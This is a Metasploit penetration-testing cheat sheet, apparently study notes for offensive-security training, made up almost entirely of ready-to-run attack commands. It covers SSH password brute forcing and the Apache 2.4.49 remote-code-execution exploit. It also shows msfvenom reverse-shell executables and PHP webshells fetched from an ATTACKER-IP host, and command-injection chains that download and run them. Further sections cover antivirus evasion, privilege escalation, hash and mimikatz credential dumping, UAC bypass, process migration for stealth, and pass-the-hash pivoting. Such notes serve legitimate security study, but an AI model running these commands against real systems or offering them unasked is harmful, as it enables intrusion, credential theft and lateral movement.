# Metasploit

The penetration Metasploit Framework `https://github.com/rapid7/metasploit-framework` is an advanced platform for developing, testing, and using exploit code. The tool features and use-cases contain components for information gathering, vulnerability research and development, client-side attacks, post-exploitation.

Similar tools

* .NET Covenant C2 Platform `https://github.com/cobbr/Covenant/blob/master/README.md`
* .PS1 Empire Post-Exploitation Framework `https://github.com/BC-SECURITY/Empire`
* Cobalt Strike C2 Platform (commercial tool) `https://www.cobaltstrike.com/`

## Getting Familiar with Metasploit

Startup

```bash
sudo msfdb init
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml
sudo systemctl enable postgresql
sudo msfconsole
mfs6 > db_status
[*] Connected to msf. Connection type: postgresql.
mfs6 > 
help
show -h
 encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
```

Workspaces

List, add new and activate workspaces

* -l list workspaces
* -a workspace to add
* -d workspace to delete
* -v verbose workspace listing
* workspace [name] switch to workspace

```shell
workspace
workspace -a oscppen200
workspace -d oscppen100
workspace oscppen200
```

DB NMap Wrapper

```shell
db_nmap --help
 [*] Usage: db_nmap [--save | [--help | -h]] [nmap options]

db_nmap -A 192.168.55.110

hosts

  address         mac  name  os_name       os_flavor  os_sp  purpose
  -------         ---  ----  -------       ---------  -----  -------
  192.168.55.110             Windows 2016                    server

services
services -p 21

  host            port  proto  name           state  info
  ----            ----  -----  ----           -----  ----
  192.168.55.110  21    tcp    ftp            open
```

### Auxiliary Modules (Aux)

Show, Search and Use auxillary modules

The modules all follow a common slash-delimited hierarchical syntax (module type/os, vendor, app, operation, or protocol/module name), which makes it easy to explore and use the modules.

SMB Scanner

```shell
show auxiliary

# Scan SMB Version
search type:auxiliary smb

use auxiliary/scanner/smb/smb_version
# or index
use 56

msf6 auxiliary(scanner/smb/smb_version) >
info
show options

services -p 445 --rhosts
RHOSTS => 192.168.50.202
# or set manually
set RHOSTS 192.168.55.110
unset RHOSTS

run 
  [*] Auxiliary module execution completed
```

```plain
vulns
  7429/overview-of-server-message-block-signing
```

Brute Force SSH Logins

```shell
show auxiliary
search type:auxiliary ssh
  16  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner

use auxiliary/scanner/ssh/ssh_login

msf6 auxiliary(scanner/ssh/ssh_login) >

show options
set RHOSTS 192.168.55.110
set RPORT 22
set USERNAME user
set PASS_FILE /usr/share/wordlists/rockyou.txt

run
  [*] 192.168.55.110:22 - Starting bruteforce
  [+] 192.168.55.110:22 - Success: 'someuser:mypasswd' 'uid=1001(george)
```

```plain
creds
  host            origin          service       public  private    realm
  ----            ------          -------       ------  -------    ----
  192.168.50.201  192.168.50.201  22/tcp (ssh)  user    password         Password
```

### Exploit Modules

```shell
workspace -a exploits

show exploits
search type:exploits Apache 2.4.49 
use exploit/multi/http/apache_normalize_path_rce

msf6 exploit(multi/http/apache_normalize_path_rce) >
info
  
   Available targets:
   Id  Name
   --  ----
   0   Automatic (Dropper)
   1   Unix Command (In-Memory)

   Check supported:
   Yes

   Indicators of compromise:
   ...

show options

  Module options (exploit/multi/http/apache_normalize_path_rce):
  ...
  Payload options (linux/x64/meterpreter/reverse_tcp):

set SSL false
set RPORT 80
set RHOSTS 192.168.55.110
set LPORT 443
set LHOST Attacker-IP

set PAYLOAD linux/x64/shell_reverse_tcp
  payload => linux/x64/shell_reverse_tcp

check
  [*] Using auxiliary/scanner/http/apache_normalize_path as check
  [+] 192.168.118.55:110 - The target is vulnerable.

run
  [*] Command shell session 1 opened (192.168.45.198:4444 -> 192.168.55.110:53190)
id
pwd
```

### Session and Jobs

Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.

List and interact with and kill sessions

* -l list
* -i index interact with session
* -k index kill session

```shell
# Session to background or close N
^Z
Background session 2? [y/N]  N

sessions -l
  2         shell x64/linux               192.168.55.110:4443 -> 192.168.50.16:35534 (192.168.50.16)

sessions -i 2
  [*] Starting interaction with 2..

 sessions -k 2
```

Run as job in the Background

```plain
run -j
sessions -l
sessions -i 2
```

## Metasploit Payloads

A *non-staged payload* is a 'all-in-one' solution, more stable but **BIGGER**, because it contains the exploit and the shell code. A *staged payload* consists of **SMALLER** stage part and larger rest of the exploit.

Scenarios

* Exploit space limitations -> *staged payload*
* Avoid anti virus detection -> *staged payload*
* Avoid network traffic -> *non-staged payload*
* Use with meterpreter -> *non-staged payload*
* else *non-staged payload*

```shell
msf6 exploit(multi/http/apache_normalize_path_rce) >

# '/' after shell indicates stage payloads
show payloads
search type:payload
search type:payload "windows x86 staged reverse TCP"
search type:payload "linux x64 staged reverse TCP"


 #   Name                                              Disclosure Date  Rank    Check  Description
 -   ----                                              ---------------  ----    -----  -----------
 15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
 20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
 ...

 set payload 15
 show options
 run

 [*] Sending stage (38 bytes) to 192.168.55.110

```

## Meterpreter Payload

Meterpreter and all of the extensions that it loads are executed entirely from **MEMORY** and communication is **ENCRYPTED** by default. Its purpose is to provide complex and advanced features that would otherwise be tedious to implement purely in assembly. The extensions can be provided via dynamic linked libraries using Reflective DDL Injection (RDI) metsrv.dll and meterpreter.{jar,php,py}.

**Warning**: **Detection rates of Meterpreter payloads are quite high** by security technologies such as antivirus solutions. We should **always attempt to obtain an initial foothold with a raw TCP shell** and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies.

Scenarios

* 🖥️ Multiple channel communications
* 🔒 Encrypted communications channels
* 📁 Transfer files to and from the target system
* 🔀 Pivot—use a hacked machine to attack others in the same network
* 🎛️ Interact with the machine via command execution, shell access, or graphical

```shell
msf6 exploit(multi/http/apache_normalize_path_rce) >
show payloads

search type:payload linux x64 meterpreter

  #   Name                                                   Disclosure Date  Rank    Check  Description
  -   ----                                                   ---------------  ----    -----  -----------
  11  payload/linux/x64/meterpreter_reverse_http             .                normal  No     Linux Meterpreter, Reverse HTTP Inline
  13  payload/linux/x64/meterpreter_reverse_https            .                normal  No     Linux Meterpreter, Reverse HTTPS Inline
  14  payload/linux/x64/meterpreter_reverse_tcp              .                normal  No     Linux Meterpreter, Reverse TCP Inline


set payload linux/x64/meterpreter_reverse_tcp
run

meterpreter > 
help
sysinfo 
getuid

shell
 Channel 1 created.
whoami
^Z

exit
```

List and interact with and kill channels

* -l list
* -i index interact with session
* -k index kill session

```shell
meterpreter >
channel -l
channel -i 1
channel -k 1
```

File System Commands download, upload and System Commands executions

```shell
meterpreter > help

  Stdapi: File system Command

  Command       Description
  -------       -----------
  cat           Read the contents of a file to the screen
  ...
  chmod         Change the permissions of a file
  download      Download a file or directory
  edit          Edit a file
  lcat          Read the contents of a local file to the screen
  lcd           Change local working directory
  ls            List files
  rm            Delete the specified file
  rmdir         Remove directory
  search        Search for files
  upload        Upload a file or directory

  Stdapi: System Commands
  =======================

  Command                   Description
  -------                   -----------
  execute                   Execute a command
  getenv                    Get one or more environment variable values
  getpid                    Get the current process identifier
  getuid                    Get the user that the server is running as
  kill                      Terminate a process
  pgrep                     Filter processes by name
  pkill                     Terminate processes by name
  ps                        List running processes
  shell                     Drop into a system command shell
  sysinfo                   Gets information about the remote system, such as OS


meterpreter >  
lcd /home/kali/Downloads
search -f passwd
download /etc/passwd
lcat /home/kali/Downloads/passwd
upload /usr/bin/unix-privesc-check /tmp/
ls /tmp
chmod 777 /tmp/unix-privesc-check
execute /tmp/unix-privesc-check
```

Meterpreter HTTPS

```shell
msf6 exploit(multi/http/apache_normalize_path_rce) >
show payloads

set payload payload/linux/x64/meterpreter_reverse_https
show options

  Payload options (linux/x64/meterpreter_reverse_https):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST  192.168.119.2    yes       The local listener hostname
  LPORT  4444             yes       The local listener port
  LURI                    no        The HTTP Path, "/" by default

run
```

## Executeable Payloads

Metasploit provides a standalone (msfvenom)[https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html] to create various types of payloads for different platforms. The tool msfvenom allows to create executeable files for client-side attacks and *webshells* to exploit website vulnerabilities.s

Basic usage

```shell
# list built-in payload
msfvenom -l payloads --platform windows --arch x64

# list payload options
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# use built-in payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=ATTACKER-IP lport=4444 -f exe -o /tmp/my_payload.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=ATTACKER-IP LPORT=443 -f exe -o met.exe

# use '-' to load custom payloads
cat payload_file.bin | ./msfvenom --payload - --arch x86 --platform win --encoder x86/shikata_ga_nai --format raw

# use '--bad-chars' to avoid bad characters like '\x00'
msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw

# use '--nopsled' Prepend a nopsled of [length] size on to the payload
msfvenom -p windows/meterpreter/bind_tcp --nosled 90 -f exe

# chain msfvenom payload outputs
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```

Hands-on "non-staged payloads"

Scenario

* use msfvenom to create a nonstaged.exe with shell_reverse_tcp
* host the nonstaged.exe file using python webserver
* use netcat to setup  listener on port 443
* download file onto victim using powershell and execute it

Attacker

```shell
# 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o nonstaged.exe
python3 -m http.server 80
nc -nvlp 443
```

Victim

```pwsh
iwr -uri http://ATTACKER-IP/nonstaged.exe -Outfile nonstaged.exe
```

Hands-on "staged payloads" with Metasploit multi/handlers module

Scenario

Requires **msf6 > use multi/handler** module

* use msfvenom to create a staged.exe with shell/reverse_tcp 
* host the nonstaged.exe file using python webserver
* use multi/handler to setup listener with payload shell/reverse_tcp 
* download file onto victim using powershell and execute it

Attacker

```shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o staged.exe
python3 -m http.server 80

msf6 exploit(multi/http/apache_normalize_path_rce) >

use multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST ATTACKER-IP
set LPORT 443
run
```

Victim

```pwsh
iwr -Uri http://ATTACKER-IP/staged.exe -Out staged.exe
./staged.exe

```

Hand-on "webshell payloads" with Metasploit multi/handlers module

Scenario:

Requires **msf6 > use multi/handler** module

* enumerate website to find file upload or command injection vulnerability
* use msfvenom to create a staged webshell with php/meterpreter/reverse_tcp
* use multi/handler to setup listener with php/meterpreter/reverse_tcp
* use curl to upload the webshell.php and trigger it on vulnerable website

Attacker

```shell
# enumerate website
gobuster dir -u http://victim.com -w /usr/share/wfuzz/wordlist/general/megabeast.txt


# list built-in webshell payloads
msfvenom -l payloads | grep -P "( php/| nodejs/| java/| python/| firefox)"

msfvenom -p php/meterpreter/reverse_tcp --list-options
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f raw > webshell.php

# very important: look into the file an remove save guards like comments
gedit webshell.pHP
head -c 10 webshell.pHP 
 <?php error
tail -c 10 webshell.pHP
 die(); ?>

use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST ATTACKER-IP
set LPORT 4444
run

# upload file directly and run it with curl
curl -F "file=@webshell.php" http://victim.com/upload.php
curl -G http://victim.com/upload/webshell.php

#  upload using linux os command injection and run it with php
python3 -m http.server 80 
curl -G http://victim.com/list.php?path=. ; wget -O /tmp/webshell.php http://ATTACKER-IP/webshell.php ;
curl -G http://victim.com/list.php?path=/tmp ; php -f /tmp/webshell.php

# upload using windows os command injection with powershell
python3 -m http.server 80
curl -G http://victim.com:8000/gitclone.php?path=https://github.com/microsoft/markitdown ; powershell iwr -Uri http://ATTACKER-IP/webshell.pHP -Out C:/xampp/htdocs/dashboard/webshell.pHP; ls C:/xampp/htdocs/dashboard/
curl -G http://victim.com/upload/webshell.php

meterpreter > sysinfo
```

## Performing Post-Exploitation with Metasploit

Scenario:

* Requires: existing meterpreter session
* Meterpreter (non-)staged payload has been deployed initialize a sessions
* Privilege escalation with getsystem
* Hidden Process executions to migrate meterpreter in other processes
* Protect against session termination and observations

```shell
meterpreter > idletime
User has been idle for: 4 mins 12 secs

# getsystem nt/authority requires SeImpersonatePrivilege
meterpreter > shell
C:\user\xxx > whoami /Priv
   SeImpersonatePrivilege        Impersonate a client after authentication Enabled
meterpreter > getsystem
 ...got system via technique

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# exectute a program to run hidden (-H)
meterpreter > execute -H -f notepad

# migrate meterpreter into another process to hide and persist connection
meterpreter > ps
meterpreter > migrate notepad-PROCESS-ID

# dump SAM (windows)
meterpreter > hashdump

# run powershell with policy bypass to check token integrity level
meterpreer > shell
powershell -ep bypass
Import-Module NtObjectManager
Get-Command -Module NtObjectManager | Select-String "IntegrityLevel"
Get-NtTokenIntegrityLevel
 Medium

# show desktop in realtime
meterpreter > screenshare

```

## Post Exploitation Modules and Extensions

```bash
# read hosts file
use post/windows/gather/enum_hostfile
set SESSION 7
run

# get envrionment variables
use post/multi/gather/env
msf6 post(multi/gather/env) > 
set SESSION 7
msf6 post(multi/gather/env) > run

# bypass uac and check token level high
search window local bypassuac
use exploit/windows/local/bypassuac_sdclt
set SESSION 7
set LHOST ATTCKER-IP
run
meterpreter > shell
powershell -ep bypass "Import-Module NtObjectManager; if((Get-NtTokenIntegrityLevel).ToString() -eq 'High') {'[*] Successully bypassed UAC!'}"

# load extension modules e.g. the mimikatz like kiwi
meterpreter > load kiwi
meterpreter > help
  creds_msv              Retrieve LM/NTLM creds (parsed)
creds_msv
Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
offsec    OFFSEC  167cf9218519a1209efc0b4bc1486a18  2f92bb1c2a2526a680122ea1b645c46093a0d837s
```

## Pivoting with Metasploit

Lateral movement (=pivot): Use an existing session to scan and attack targets in the network behind the compromised remote machine

Scenario

* Requires: Require meterpreter session on remote machine
* Use ifconfig to list interfaces on the remote machine
* Use route to add a route to network reachable form remote
* Use meterpreter session ID as gateway for lateral movement
* Start auxiliary portscan on the target network
* Start exploiting targets connected to the compromised remote machine

```bash
# auto route 
use post/multi/manage/autoroute
set session 1
run

# add routes manually
meterpreter > 
ifconfig
  ...
  IPv4 Address : 172.16.189.199
bg
[*] Backgrounding session 55...
msf6 >
route flush
route add 172.16.189.0/24 55
route print

# use aux port scanning to scan target network 
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.189.200
set PORTS 445,3389

# use smb psexec exploit with found credentials to pivot to target
# use pass-the-hash instead if password is unknown
# important: set payload bind shell, cause reverse shell can NOT find a route to attacker
use exploit/windows/smb/psexec
set SMBUser user
set SMBPass passwort or
set SMBPass NTLM_hash e.g.
set SMBPass 00000000000000000000000000000000:545414c16b5689513d4ad8234391aacf
set RHOSTS VICTIM-IP
set PAYLOAD windows/x64/meterpreter/bind_tcp
set LPORT 8080

# did not work!
# use aux socks proxy to run applications outside of metasploit
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
proxychains ...

# use port forward for a single port e.g. RDP
portfwd
portfwd add -l 3389 -p 3389 -r 172.16.189.200
sudo xfreerdp3 /v:127.0.0.1 /u:user

```

## Automating Metasploit

Advance Options

```bash
msf6 (multi/handler)>
show advanced

# auto migrate to notepad
set AutoRunScript post/windows/manage/migrate 

# listen for multiple session
set ExitOnSession false

# run in background wait for interactions
run -z -j
```

Run automation resource scripts

```bash
cat https_multi_handler.rc

use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.145.234
set LPORT 443
set AutoRunScript post/windows/manage/priv_migrate 
set ExitOnSession false
run -z -j

# Run resource file
sudo msfconsole -r https_multi_handler.rc

# More resource files here
ls -l /usr/share/metasploit-framework/scripts/resource
```
